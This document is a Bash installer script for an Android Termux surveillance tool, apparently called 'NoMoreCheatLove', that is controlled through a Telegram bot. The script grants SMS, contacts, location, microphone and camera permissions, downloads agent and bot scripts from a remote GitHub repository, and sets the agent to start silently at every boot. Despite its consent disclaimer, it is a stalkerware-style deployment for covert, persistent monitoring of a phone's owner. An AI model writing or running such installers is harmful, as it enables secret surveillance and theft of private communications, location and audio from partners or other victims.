#!/bin/bash

# ⚠️ Legal Disclaimer: This script must only be used with explicit consent. Unauthorized use is illegal.

# Modern ANSI UI
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
NC='\033[0m'
echo -e "${BLUE}
╔═╗┌─┐┌┬┐┬─┐┌─┐┬  ┬┌─┐┬─┐  ╔═╗┌─┐┌─┐┬┌┐┌┌─┐
║  │ ││││├┬┘├┤ └┐┌┘├┤ ├┬┘  ║  ├─┤│  ││││└─┐
╚═╝└─┘┴ ┴┴└─└─┘ └┘ └─┘┴└─  ╚═╝┴ ┴└─┘┴┘└┘└─┘
${NC}"

# Check if running in Termux
if [ ! -d "/data/data/com.termux" ]; then
    echo -e "${RED}❌ This script must be run in Termux on Android.${NC}"
    exit 1
fi

# Setup configuration directory
CONFIG="$HOME/.nmcl_env"
mkdir -p ~/.nmcl && cd ~/.nmcl

# Install dependencies
echo -e "${YELLOW}🔄 Updating packages and installing dependencies...${NC}"
pkg update -y && pkg install -y termux-api python git && pip install python-telegram-bot requests

# Telegram bot token and admin setup
echo -e "${YELLOW}🔑 Configuring Telegram Bot...${NC}"
read -p "Enter Telegram Bot Token: " TOKEN
read -p "Enter Admin Chat ID: " ADMIN
echo "TOKEN=$TOKEN" > "$CONFIG"
echo "ADMIN=$ADMIN" >> "$CONFIG"

# Grant necessary permissions
echo -e "${YELLOW}🔓 Granting permissions...${NC}"
termux-setup-storage
for perm in sms contacts location microphone camera; do
    termux-"$perm"-permission
done

# Download agent and bot scripts
echo -e "${YELLOW}📥 Downloading agent and bot scripts...${NC}"
curl -sL https://raw.githubusercontent.com/likhonsheikhofficial/NoMoreCheatLove/main/nmcl_agent.py > nmcl_agent.py
curl -sL https://raw.githubusercontent.com/likhonsheikhofficial/NoMoreCheatLove/main/nmcl_bot.py > nmcl_bot.py

# Setup autostart
echo -e "${YELLOW}🔄 Setting up autostart...${NC}"
mkdir -p ~/.termux/boot
echo 'python ~/.nmcl/nmcl_agent.py > /dev/null 2>&1 &' > ~/.termux/boot/nmcl_start

# Launch services
echo -e "${YELLOW}🚀 Launching services...${NC}"
python nmcl_bot.py &
python nmcl_agent.py &

echo -e "${GREEN}✅ Installation Complete! Bot is running.${NC}"
